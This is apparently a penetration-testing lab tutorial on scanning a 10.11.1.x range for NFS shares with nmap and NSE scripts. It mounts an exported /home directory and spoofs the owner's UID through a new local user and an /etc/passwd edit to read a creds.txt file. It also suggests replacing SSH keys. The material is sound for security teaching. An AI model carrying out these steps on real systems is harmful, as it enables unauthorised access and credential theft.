## Scanning for NFS shares
Both Portmapper and RPCbind run on TCP port 111. RPCbin maps RPC services to the ports on which they listen, and RPC processes notify RPCbind when they start, registering the ports they are listening on and the RPC program numbers they expect to serve.

The RPCbin service redirects the client to the proper port number (often TCP port 2049) so it can communicate with the requested service.
```bash
nmap -v -p 111 10.11.1.1-254
```

We can use NSE scripts like rpcinfo to find services that may have registered with rpcbind:
```bash
nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254
```

## Nmap NFS NSE scripts
We can use NSE scripts found in the **/usr/shar/nmap/scripts** directory to collect and enumerate NFS services.
```bash
ls -1 /usr/share/nmap/scripts/nfs*
```

All the scripts can be run using the wildcard character * in the script name
```bash
nmap -p 111 --script nfs* 10.11.1.72

# Nmap scan report for 10.11.1.72

# PORT    STATE SERVICE
# 111/tcp open  rpcbind
# | nfs-showmount: 
# |_  /home 10.11.0.0/255.255.0.0

```

In this case, the **/home** directory is being shared and can be accessed by mounting on your own machine. **-o nolock** is used to disable file locking, which is often needed for older NFS servers.
```bash
mkdir home
sudo mount -o nolock 10.11.1.72:/home ~/home/
cd home/ && ls
```

```bash
cd marcus
ls -la


# total 24
# drwxr-xr-x 2 1014  1014 4096 Jun 10 09:16 .
# drwxr-xr-x 7 root root 4096 Sep 17  2015 ..
# -rwx------ 1 1014  1014   48 Jun 10 09:16 creds.txt


cat creds.txt

# cat: creds.txt: Permission denied

```

It appears we do not have permission to view this file. Taking a closer look at the file permissions, we can see that its owner has a UUID of 1014, and also _read (r)_, _write (w)_, and _execute (x)_ permissions on it. 

Since we have complete access to our Kali machine, we can try to add a local user to it using the adduser command, change its UUID to 1014, su to that user, and then try accessing the file again:
```bash
sudo adduser pwn

sudo sed -i -e 's/1001/1014/g' /etc/passwd

cat /etc/passwd | grep pwn

# pwn:x:1014:1014:,,,:/home/pwn:/bin/bash
```

Switching to the newly added *pwn* user, we use **id** to display the current user ID
```bash
su pwn

id

# uid=1014(pwn) gid=1014 groups=1014

cat creds.txt
```

We can now read the file and make changes to it if we so wish. We can make use of this access to replace SSH keys, read confidential files etc.

## Topical Exercises

1. Use Nmap to make a list of machines running NFS in the labs.
```bash
nmap -v -p 111 10.11.1.1-254 -oG nfsscan
grep open nfsscan | cut -d " " -f 2 > nfshosts
```

2. Use NSE scripts to scan these systems and collect additional information about accessible shares.
```bash
nmap -p 111 --script /usr/share/nmap/scripts/nfs* -iL nfshosts -oG nfsnsescan
nmap -p 111 --script nfs-showmount -iL nfshosts
```
